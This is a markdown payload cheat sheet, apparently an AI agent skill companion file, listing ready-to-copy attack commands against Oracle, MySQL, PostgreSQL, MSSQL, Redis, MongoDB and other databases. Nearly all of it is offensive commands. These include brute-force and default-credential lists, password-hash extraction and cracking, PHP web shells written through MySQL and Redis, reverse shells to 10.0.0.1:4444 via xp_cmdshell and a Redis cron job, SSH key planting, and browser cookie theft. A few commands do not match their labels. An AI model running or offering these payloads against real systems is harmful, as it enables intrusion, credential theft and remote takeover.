# Database Attack Payloads

> This file is a companion to `SKILL.md`, organizing attack payloads by database type.
> Purpose: Quickly find tool commands for specific database attack scenarios, ready to copy for testing.
> All payloads are for authorized security testing only.

---

## Index

1. [Oracle Attacks](#1-oracle-attacks)
2. [MySQL/MariaDB Attacks](#2-mysqlmariadb-attacks)
3. [PostgreSQL Attacks](#3-postgresql-attacks)
4. [MSSQL/Sybase Attacks](#4-mssqlsybase-attacks)
5. [Redis Exploitation](#5-redis-exploitation)
6. [MongoDB Attacks](#6-mongodb-attacks)
7. [Multi-Protocol Brute Force](#7-multi-protocol-brute-force)

---

## 1. Oracle Attacks

### Oracle TNS Listener Scanning with oscanner

```bash
# Basic Oracle TNS listener scan
oscanner -s 192.168.1.100

# Scan with custom port
oscanner -s 192.168.1.100 -P 1522
```

### Oracle SID Enumeration with odat

```bash
# SID guessing — brute-force common Oracle SID names
odat sidguesser -s 192.168.1.100 -p 1521

# SID guessing with custom wordlist
odat sidguesser -s 192.168.1.100 -p 1521 --sid-file=/usr/share/odat/sids.txt

# Quick test for common SIDs
odat sidguesser -s 192.168.1.100 -p 1521 --sids ORCL,XE,PROD,TEST,DEV,DB01
```

### Oracle Credential Brute-Force with odat

```bash
# Password guessing with default accounts
odat passwordguesser -s 192.168.1.100 -d ORCL

# Password guessing with custom wordlists
odat passwordguesser -s 192.168.1.100 -d ORCL --accounts-file accounts.txt

# Password guessing for specific account
odat passwordguesser -s 192.168.1.100 -d ORCL -U sys -P passwords.txt
```

### Oracle Full Exploitation with odat

```bash
# Run all odat modules against target
odat all -s 192.168.1.100 -d ORCL -U sys -P change_on_install

# Read file via UTL_FILE
odat utlfile -s 192.168.1.100 -d ORCL -U sys -P change_on_install \
  --getFile /etc/passwd

# Write file via UTL_FILE
odat utlfile -s 192.168.1.100 -d ORCL -U sys -P change_on_install \
  --putFile /tmp test.txt /local/test.txt

# Execute OS command via DBMS_SCHEDULER
odat dbmsscheduler -s 192.168.1.100 -d ORCL -U sys -P change_on_install \
  --exec "id"

# Execute OS command via external table
odat externaltable -s 192.168.1.100 -d ORCL -U sys -P change_on_install \
  --exec "cat /etc/shadow"
```

### Oracle Credential and Link Extraction

```bash
# Extract password hashes from Oracle
odat passwordstealer -s 192.168.1.100 -d ORCL -U sys -P change_on_install

# Enumerate database links
odat dblink -s 192.168.1.100 -d ORCL -U sys -P change_on_install

# Check for Java execution capability
odat java -s 192.168.1.100 -d ORCL -U sys -P change_on_install
```

---

## 2. MySQL/MariaDB Attacks

### MySQL Authentication Testing

```bash
# Test empty root password (common default)
mysql -h 192.168.1.100 -u root -p'' -e "SELECT @@version"

# Test default credentials
mysql -h 192.168.1.100 -u root -proot -e "SELECT user, host FROM mysql.user"
mysql -h 192.168.1.100 -u root -pmysql -e "SHOW DATABASES"

# Connect with specific database
mysql -h 192.168.1.100 -u dbuser -pdbpass target_db -e "SHOW TABLES"
```

### MySQL Post-Authentication Enumeration

```bash
# List all users and hosts
mysql -h 192.168.1.100 -u root -e "SELECT user, host, authentication_string FROM mysql.user"

# Check file privileges
mysql -h 192.168.1.100 -u root -e "SELECT file_priv FROM mysql.user WHERE user='root'"

# List all databases
mysql -h 192.168.1.100 -u root -e "SHOW GRANTS FOR CURRENT_USER"
```

### MySQL File Read/Write (requires FILE privilege)

```bash
# Read local file via LOAD_FILE
mysql -h 192.168.1.100 -u root -e "SELECT LOAD_FILE('/etc/passwd')"

# Write web shell via INTO OUTFILE
mysql -h 192.168.1.100 -u root -e \
  "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'"

# Read MySQL data directory contents
mysql -h 192.168.1.100 -u root -e "SELECT LOAD_FILE('/var/lib/mysql/auto.cnf')"
```

### MySQL Brute-Force with hydra

```bash
# MySQL brute-force with single user
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.100

# MySQL brute-force with user list
hydra -L users.txt -P passwords.txt mysql://192.168.1.100 -t 4 -W 3

# MySQL brute-force with custom port
hydra -l root -P passwords.txt mysql://192.168.1.100:3307
```

---

## 3. PostgreSQL Attacks

### PostgreSQL Authentication Testing

```bash
# Test default credentials
psql -h 192.168.1.100 -U postgres -W -c "SELECT version()"

# Test trust authentication (no password)
psql -h 192.168.1.100 -U postgres -c "SELECT current_user"

# Connect with specific database
psql -h 192.168.1.100 -U postgres -d template1 -c "SELECT datname FROM pg_database"
```

### PostgreSQL File Read via COPY

```bash
# Read file using COPY (requires superuser)
psql -h 192.168.1.100 -U postgres -c \
  "COPY (SELECT 1) TO PROGRAM 'cat /etc/passwd'"

# Create external table for file reading
psql -h 192.168.1.100 -U postgres -c \
  "CREATE TEMP TABLE tempfile(lines text); COPY tempfile FROM '/etc/passwd'; SELECT * FROM tempfile"
```

### PostgreSQL Code Execution

```bash
# Execute OS command via COPY TO PROGRAM (PostgreSQL 9.3+)
psql -h 192.168.1.100 -U postgres -c \
  "COPY (SELECT 'id') TO PROGRAM 'id > /tmp/output'"

# Check if PL/Python is available
psql -h 192.168.1.100 -U postgres -c \
  "SELECT lanname FROM pg_language WHERE lanname LIKE 'plpython%'"

# Execute Python code via PL/PythonU
psql -h 192.168.1.100 -U postgres -c \
  "CREATE OR REPLACE FUNCTION exec(cmd text) RETURNS text AS \$\$
  import subprocess; return subprocess.check_output(cmd, shell=True).decode()
  \$\$ LANGUAGE plpythonu; SELECT exec('id')"
```

### PostgreSQL Brute-Force

```bash
# PostgreSQL brute-force with hydra
hydra -l postgres -P passwords.txt postgres://192.168.1.100

# PostgreSQL brute-force with patator
patator pgsql_login host=192.168.1.100 user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt -t 4
```

---

## 4. MSSQL/Sybase Attacks

### MSSQL Authentication with sqsh

```bash
# Connect to MSSQL with empty sa password (common default)
sqsh -S 192.168.1.100 -U sa -P '' -C "SELECT @@version"

# Connect with credentials
sqsh -S 192.168.1.100 -U sa -P 'P@ssw0rd' -C "SELECT name FROM sys.databases"

# Connect using Windows authentication (via FreeTDS)
sqsh -S 192.168.1.100 -U 'DOMAIN\user' -P 'password' -C "SELECT SYSTEM_USER"
```

### MSSQL OS Command Execution via xp_cmdshell

```bash
# Enable xp_cmdshell (requires sysadmin)
sqsh -S 192.168.1.100 -U sa -P 'password' -C \
  "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"

# Execute OS command
sqsh -S 192.168.1.100 -U sa -P 'password' -C "xp_cmdshell 'whoami'"

# Reverse shell via xp_cmdshell
sqsh -S 192.168.1.100 -U sa -P 'password' -C \
  "xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
```

### MSSQL Credential Extraction

```bash
# Extract password hashes from sys.sql_logins
sqsh -S 192.168.1.100 -U sa -P 'password' -C \
  "SELECT name, password_hash FROM sys.sql_logins"

# Enumerate all logins and server roles
sqsh -S 192.168.1.100 -U sa -P 'password' -C \
  "SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U')"

# Check linked servers (pivot targets)
sqsh -S 192.168.1.100 -U sa -P 'password' -C \
  "SELECT name, product, provider, data_source FROM sys.servers"
```

### MSSQL Brute-Force

```bash
# MSSQL brute-force with hydra
hydra -l sa -P passwords.txt mssql://192.168.1.100

# MSSQL brute-force with ncrack
ncrack -p 1433 192.168.1.100 -u sa -P passwords.txt

# MSSQL brute-force with patator
patator mssql_login host=192.168.1.100 user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt -t 4
```

---

## 5. Redis Exploitation

### Redis Unauthenticated Access

```bash
# Test unauthenticated connection
redis-cli -h 192.168.1.100 INFO server

# Enumerate all keys
redis-cli -h 192.168.1.100 KEYS '*'

# Check configuration
redis-cli -h 192.168.1.100 CONFIG GET requirepass
redis-cli -h 192.168.1.100 CONFIG GET dir
redis-cli -h 192.168.1.100 CONFIG GET dbfilename
```

### Redis Data Extraction

```bash
# Get all data from a specific key
redis-cli -h 192.168.1.100 GET "session:admin"

# Dump entire database
redis-cli -h 192.168.1.100 --rdb /tmp/dump.rdb SAVE

# List all databases and key counts
redis-cli -h 192.168.1.100 INFO keyspace
```

### Redis Write Exploitation — SSH Key and Web Shell

```bash
# Write SSH authorized_keys via Redis
# Generate key pair first: ssh-keygen -t rsa -f /tmp/redis_key
(echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") > /tmp/redis_payload.txt
redis-cli -h 192.168.1.100 CONFIG SET dir /root/.ssh
redis-cli -h 192.168.1.100 CONFIG SET dbfilename authorized_keys
redis-cli -h 192.168.1.100 FLUSHALL
cat /tmp/redis_payload.txt | redis-cli -h 192.168.1.100 -x SET ssh_key
redis-cli -h 192.168.1.100 SAVE
# SSH in: ssh -i /tmp/redis_key root@192.168.1.100

# Write web shell via Redis
redis-cli -h 192.168.1.100 CONFIG SET dir /var/www/html
redis-cli -h 192.168.1.100 CONFIG SET dbfilename shell.php
redis-cli -h 192.168.1.100 SET payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h 192.168.1.100 SAVE
```

### Redis Module Loading and Lua Sandbox Escape

```bash
# Execute Lua script (sandboxed by default)
redis-cli -h 192.168.1.100 EVAL "return redis.call('INFO')" 0

# Attempt Lua sandbox escape (Redis < 5.0.13 with specific configs)
redis-cli -h 192.168.1.100 EVAL \
  "local f=io.open('/etc/passwd','r'); return f:read('*all'); f:close()" 0

# Load malicious module (if module loading is enabled)
redis-cli -h 192.168.1.100 MODULE LOAD /tmp/exploit.so
```

### Redis with Authentication

```bash
# Connect with password
redis-cli -h 192.168.1.100 -a 'P@ssw0rd' INFO

# Brute-force Redis password with hydra
hydra -l redis -P passwords.txt redis://192.168.1.100

# Brute-force with patator (custom protocol)
patator redis_login host=192.168.1.100 password=FILE0 0=passwords.txt
```

---

## 6. MongoDB Attacks

### MongoDB Unauthenticated Access

```bash
# Test unauthenticated connection and enumerate databases
mongo --host 192.168.1.100 --port 27017 --eval "db.adminCommand('listDatabases')"

# Enumerate collections in a database
mongo --host 192.168.1.100 --port 27017 --eval \
  "db = db.getSiblingDB('target_db'); db.getCollectionNames()"

# Extract all documents from a collection
mongo --host 192.168.1.100 --port 27017 --eval \
  "db = db.getSiblingDB('target_db'); db.users.find().forEach(printjson)"
```

### MongoDB Security Audit with mongoaudit

```bash
# Full security audit
mongoaudit -h 192.168.1.100 -p 27017

# Audit with authentication
mongoaudit -h 192.168.1.100 -p 27017 -u admin -p password

# Check for specific misconfigurations
mongo --host 192.168.1.100 --eval "db.adminCommand({getCmdLineOpts: 1})"
```

### MongoDB Code Execution

```bash
# Execute JavaScript via eval (requires specific roles)
mongo --host 192.168.1.100 --eval \
  "db.eval('function(){return db.users.find().toArray()}')"

# NoSQL injection in eval/MapReduce
mongo --host 192.168.1.100 --eval \
  "db.users.mapReduce(function(){emit(this.name,1)}, function(k,vals){return vals.length}, {out:'result'})"

# Abuse $where with JavaScript injection
mongo --host 192.168.1.100 --eval \
  "db.users.find({\$where: 'sleep(3000) && this.username==\"admin\"'})"
```

### MongoDB Data Exfiltration

```bash
# Export entire database to JSON
mongoexport --host 192.168.1.100 --db target_db --collection users --out users.json

# Export with query filter
mongoexport --host 192.168.1.100 --db target_db --collection users \
  --query '{"role": "admin"}' --out admins.json

# Dump entire database
mongodump --host 192.168.1.100 --db target_db --out /tmp/mongo_dump
```

---

## 7. Multi-Protocol Brute Force

### hydra — Database Protocol Brute-Force

```bash
# MySQL brute-force
hydra -L users.txt -P passwords.txt mysql://192.168.1.100 -t 4 -W 3

# PostgreSQL brute-force
hydra -l postgres -P passwords.txt postgres://192.168.1.100 -t 4

# MSSQL brute-force
hydra -l sa -P passwords.txt mssql://192.168.1.100 -t 4

# Oracle brute-force (via TNS)
hydra -l sys -P passwords.txt oracle://192.168.1.100 -t 2

# Oracle with SID specified
hydra -l sys -P passwords.txt oracle-sid://192.168.1.100/ORCL -t 2

# Multiple targets with throttling
hydra -L users.txt -P passwords.txt -M targets.txt mysql -t 2 -W 5
```

### ncrack — High-Speed Network Authentication Cracking

```bash
# MySQL cracking
ncrack -p 3306 192.168.1.100 -u root -P passwords.txt

# MSSQL cracking
ncrack -p 1433 192.168.1.100 -u sa -P passwords.txt

# Multiple database services simultaneously
ncrack -p 3306,1433,5432 192.168.1.100 -u root,sa,postgres -P passwords.txt

# Network range scan with credential testing
ncrack -p 3306 192.168.1.0/24 -u root -P passwords.txt -T3

# Resume interrupted scan
ncrack --resume /tmp/ncrack_restore
```

### patator — Modular Multi-Protocol Brute-Force

```bash
# MySQL brute-force
patator mysql_login host=192.168.1.100 user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt -t 4 -x ignore:fgrep='Access denied'

# PostgreSQL brute-force
patator pgsql_login host=192.168.1.100 user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt -t 4

# MSSQL brute-force
patator mssql_login host=192.168.1.100 user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt -t 4

# MySQL password spray (one password, many users)
patator mysql_login host=192.168.1.100 user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt -t 1 -x ignore:fgrep='Access denied'

# Oracle brute-force
patator oracle_login host=192.168.1.100 sid=ORCL user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt -t 2
```

### Database-Specific Default Credentials Lists

```bash
# Common Oracle default accounts to test
# sys/change_on_install, system/manager, scott/tiger, dbsnmp/dbsnmp
# outln/outln, ctxsys/ctxsys, mdsys/mdsys

# Common MySQL default accounts
# root/(empty), root/root, mysql/mysql, test/test

# Common MSSQL default accounts
# sa/(empty), sa/sa, sa/password, sa/P@ssw0rd

# Common PostgreSQL default accounts
# postgres/postgres, postgres/(empty), postgres/password

# Common Redis defaults
# (no password), redis/redis, foobared (default config example)
```

---

## 8. SQLite and File-Based Database Attacks

### SQLite Data Extraction

```bash
# Read SQLite database file directly
sqlite3 /path/to/database.db ".tables"
sqlite3 /path/to/database.db ".dump"

# Extract specific table data
sqlite3 /path/to/database.db "SELECT * FROM users;"
sqlite3 /path/to/database.db "SELECT sql FROM sqlite_master WHERE type='table';"

# Crack SQLite database encryption (if SQLCipher is used)
sqlcipher /path/to/encrypted.db "PRAGMA key = 'guess_password'; SELECT count(*) FROM sqlite_master;"
```

### Microsoft Access Database Attacks

```bash
# Read .mdb file with mdbtools
mdb-tables database.mdb
mdb-schema database.mdb
mdb-export database.mdb target_table

# Dump all tables from Access database
for table in $(mdb-tables database.mdb); do
  echo "=== $table ==="
  mdb-export database.mdb "$table"
done
```

### Elasticsearch Unauthenticated Access

```bash
# Enumerate Elasticsearch indices
curl -s http://192.168.1.100:9200/_cat/indices?v

# Dump all documents from an index
curl -s http://192.168.1.100:9200/target_index/_search?size=10000 | jq '.hits.hits[]._source'

# Check cluster health and node information
curl -s http://192.168.1.100:9200/_cluster/health?pretty
curl -s http://192.168.1.100:9200/_nodes?pretty

# Read Elasticsearch configuration
curl -s http://192.168.1.100:9200/_nodes/_all?filter_path=nodes.*.settings
```

### InfluxDB Time-Series Database Attacks

```bash
# Test unauthenticated InfluxDB access (port 8086)
curl -s http://192.168.1.100:8086/query?q=SHOW+DATABASES

# Enumerate measurements (tables) in a database
curl -s http://192.168.1.100:8086/query?db=_internal&q=SHOW+MEASUREMENTS

# Dump all data from a measurement
curl -s http://192.168.1.100:8086/query?db=target_db&q=SELECT+*+FROM+sensor_data

# Check InfluxDB version and build
curl -s http://192.168.1.100:8086/debug/vars | head -20
```

### LDAP-as-a-Database Enumeration

```bash
# Enumerate LDAP directory (often paired with database auth)
ldapsearch -x -H ldap://192.168.1.100 -b "dc=target,dc=lab" "(objectClass=person)"

# Extract all user accounts from LDAP
ldapsearch -x -H ldap://192.168.1.100 -b "dc=target,dc=lab" \
  "(objectClass=user)" sAMAccountName mail | grep -E "sAMAccountName|mail"

# Test LDAP bind with discovered credentials
ldapsearch -x -H ldap://192.168.1.100 -D "cn=admin,dc=target,dc=lab" -w password \
  -b "dc=target,dc=lab" "(objectClass=*)"
```

---

## 9. Database Port Scanning and Service Detection

### Nmap Database Service Discovery

```bash
# Scan for all common database ports
nmap -sT -sV -p 1433,1434,1521,3306,5432,5985,6379,7474,8086,8529,9090,9200,27017,27018 192.168.1.0/24

# UDP scan for MSSQL browser service
nmap -sU -p 1434 --script ms-sql-discovery 192.168.1.0/24

# Oracle TNS listener detection
nmap -sT -p 1521 --script oracle-tns-listener 192.168.1.0/24
```

### Redis Advanced Exploitation

```bash
# Redis: write cron job for reverse shell
redis-cli -h 192.168.1.100 CONFIG SET dir /var/spool/cron
redis-cli -h 192.168.1.100 CONFIG SET dbfilename root
redis-cli -h 192.168.1.100 SET cronjob "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
redis-cli -h 192.168.1.100 SAVE

# Redis: write webshell to known webroot
redis-cli -h 192.168.1.100 CONFIG SET dir /var/www/html
redis-cli -h 192.168.1.100 CONFIG SET dbfilename shell.php
redis-cli -h 192.168.1.100 SET payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h 192.168.1.100 SAVE
```

### MySQL UDF (User Defined Function) Exploitation

```bash
# Upload UDF library for OS command execution via MySQL
# Requires FILE privilege and plugin directory write access
mysql -h 192.168.1.100 -u root -e "SHOW VARIABLES LIKE 'plugin_dir'"

# Write the UDF shared library to the plugin directory
mysql -h 192.168.1.100 -u root -e "
  CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
"

# Execute OS commands via UDF
mysql -h 192.168.1.100 -u root -e "SELECT sys_exec('id > /tmp/output')"

# Read the command output
mysql -h 192.168.1.100 -u root -e "SELECT LOAD_FILE('/tmp/output')"
```

### Oracle TNS Listener Attack Chain

```bash
# Oracle TNS listener version and status
tnscmd10g version -h 192.168.1.100 -p 1521

# Oracle TNS listener status
tnscmd10g status -h 192.168.1.100 -p 1521

# Oracle TNS listener services enumeration
tnscmd10g services -h 192.168.1.100 -p 1521

# Extract Oracle password hashes for offline cracking
odat passwordstealer -s 192.168.1.100 -d ORCL -U sys -P change_on_install
```

### MSSQL Linked Server Pivot

```bash
# Enumerate linked servers for lateral database movement
sqsh -S 192.168.1.100 -U sa -P 'password' -C "
  SELECT name, product, provider, data_source FROM sys.servers
"

# Execute queries on linked server (database pivot)
sqsh -S 192.168.1.100 -U sa -P 'password' -C "
  EXEC ('SELECT @@version') AT [LINKED_SERVER_NAME]
"

# Enable xp_cmdshell on linked server through pivot
sqsh -S 192.168.1.100 -U sa -P 'password' -C "
  EXEC ('EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE') AT [LINKED_SERVER_NAME]
"
```

### Memcached Exploitation

```bash
# Test unauthenticated Memcached access (default port 11211)
echo "stats" | nc -w 3 192.168.1.100 11211

# Dump all keys from Memcached
echo "stats cachedump 15 0" | nc -w 3 192.168.1.100 11211
echo "get key_name" | nc -w 3 192.168.1.100 11211

# Extract all slab information
echo "stats slabs" | nc -w 3 192.168.1.100 11211
```

---

## 10. Database Post-Exploitation Automation

### Automated Database Dump Script

```bash
#!/bin/bash
# Automated database enumeration and dump script
TARGET="$1"
DB_TYPE="$2"

case "$DB_TYPE" in
  mysql)
    mysql -h "$TARGET" -u root -e "SHOW DATABASES" 2>/dev/null | tail -n +2 | while read db; do
      echo "Dumping database: $db"
      mysqldump -h "$TARGET" -u root "$db" > "${db}_dump.sql" 2>/dev/null
    done
    ;;
  postgres)
    psql -h "$TARGET" -U postgres -t -A -c "SELECT datname FROM pg_database WHERE datistemplate=false" | while read db; do
      echo "Dumping database: $db"
      pg_dump -h "$TARGET" -U postgres "$db" > "${db}_dump.sql" 2>/dev/null
    done
    ;;
  mssql)
    sqsh -S "$TARGET" -U sa -P '' -C "SELECT name FROM sys.databases" -o /tmp/dbs.txt
    ;;
esac
```

### SQLite Forensic Extraction

```bash
# Extract data from common SQLite databases found during pentest
# Firefox cookies
sqlite3 ~/mozilla/firefox/*.default/cookies.sqlite "SELECT host, name, value FROM moz_cookies" 2>/dev/null

# Chrome history
sqlite3 ~/.config/google-chrome/Default/History "SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 50" 2>/dev/null

# Extract all tables and schemas from an unknown SQLite database
sqlite3 target.db ".schema" 2>/dev/null
sqlite3 target.db ".tables" 2>/dev/null
for table in $(sqlite3 target.db ".tables"); do
  echo "=== $table ==="
  sqlite3 target.db "SELECT * FROM $table LIMIT 20;"
done
```

---

## 11. Database Privilege Escalation Techniques

### MySQL Privilege Escalation

```bash
# Check current user privileges
mysql -h 192.168.1.100 -u dbuser -pdbpass -e "SHOW GRANTS FOR CURRENT_USER()"

# Attempt to grant additional privileges (if GRANT OPTION is available)
mysql -h 192.168.1.100 -u dbuser -pdbpass -e "GRANT ALL PRIVILEGES ON *.* TO 'dbuser'@'%'"

# Check for access to mysql system database
mysql -h 192.168.1.100 -u dbuser -pdbpass -e "SELECT user, host, authentication_string FROM mysql.user"
```

### PostgreSQL Superuser Escalation

```bash
# Check if current user can create extensions (indicates high privilege)
psql -h 192.168.1.100 -U dbuser -c "SELECT * FROM pg_available_extensions WHERE installed_version IS NOT NULL"

# Attempt to load malicious extension (requires superuser)
psql -h 192.168.1.100 -U dbuser -c "CREATE EXTENSION IF NOT EXISTS plpython3u"

# Check for large object support (potential file read/write)
psql -h 192.168.1.100 -U dbuser -c "SELECT lo_create(1234)"
```

---

## 12. Database Traffic Interception

### MySQL Traffic Sniffing

```bash
# Capture MySQL traffic for credential extraction
tcpdump -i eth0 -w mysql_traffic.pcap port 3306

# Extract MySQL authentication handshake from capture
tshark -r mysql_traffic.pcap -Y "mysql" -T fields -e mysql.user -e ip.src -e ip.dst | sort -u

# Analyze MySQL query patterns for sensitive data
tshark -r mysql_traffic.pcap -Y "mysql.query" -T fields -e mysql.query | grep -iE "INSERT|UPDATE|SELECT.*FROM.*user|password"
```

### Redis Traffic Analysis

```bash
# Capture Redis traffic for command analysis
tcpdump -i eth0 -w redis_traffic.pcap port 6379

# Extract Redis commands from capture
tshark -r redis_traffic.pcap -Y "tcp.port==6379" -T fields -e tcp.payload 2>/dev/null | \
  while read payload; do echo "$payload" | xxd -r -p 2>/dev/null; done | strings
```

---

## 13. Database Credential Hash Cracking

### MSSQL Hash Cracking

```bash
# Extract and crack MSSQL password hashes
sqsh -S 192.168.1.100 -U sa -P 'password' -C "SELECT name, password_hash FROM sys.sql_logins" > mssql_hashes.txt

# Crack with hashcat (mode 1731 = MSSQL 2012+)
hashcat -m 1731 -a 0 mssql_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### MySQL Hash Cracking

```bash
# Extract MySQL password hashes
mysql -h 192.168.1.100 -u root -e "SELECT user, host, authentication_string FROM mysql.user WHERE authentication_string != ''" > mysql_hashes.txt

# Crack with hashcat (mode 300 = MySQL 5.x+)
hashcat -m 300 -a 0 mysql_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Database Port Discovery with Masscan

```bash
masscan 192.168.1.0/24 -p 1433,1521,3306,5432,6379,27017 --rate=1000
```
